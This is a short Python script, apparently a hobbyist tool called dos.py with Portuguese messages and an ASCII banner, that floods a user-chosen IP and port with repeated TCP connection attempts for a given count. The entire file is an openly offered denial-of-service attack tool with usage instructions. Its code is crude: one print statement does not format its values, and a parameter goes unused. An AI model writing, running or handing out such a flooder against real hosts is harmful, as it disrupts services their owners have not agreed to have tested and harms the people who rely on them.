import socket
import sys
import os


main = """
 ____       ____  
|  _ \  ___/ ___| 
| | | |/ _ \___ \ 
| |_| | (_) |__) |
|____/ \___/____/ 

Powered by @Nxrman_...\n\n"""
count = 0

def init(ip, port, main):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.settimeout(0.03)
	code = client.connect_ex((ip, int(port)))
	if code == 0:
		print("[==>] - Realizando ataque.")
		print("IP: %s, PORT:%s", ip, port)
	else:
		print("Servidor Indisponivel ou Porta fechada!\n")


if len(sys.argv) < 4:
	print("""
 ____       ____  
|  _ \  ___/ ___| 
| | | |/ _ \___ \ 
| |_| | (_) |__) |
|____/ \___/____/ 

Powered by @Nxrman_...\n""")
	print("Modo de uso: python dos.py <IP> <PORTA> <TEMPO>")
	sys.exit(0)
else:
	ip = sys.argv[1]
	port = sys.argv[2]
	quantia = int(sys.argv[3])
	while count < quantia:
		count+=1
		init(ip, port, main)
	print("[!] DoS Parado.")
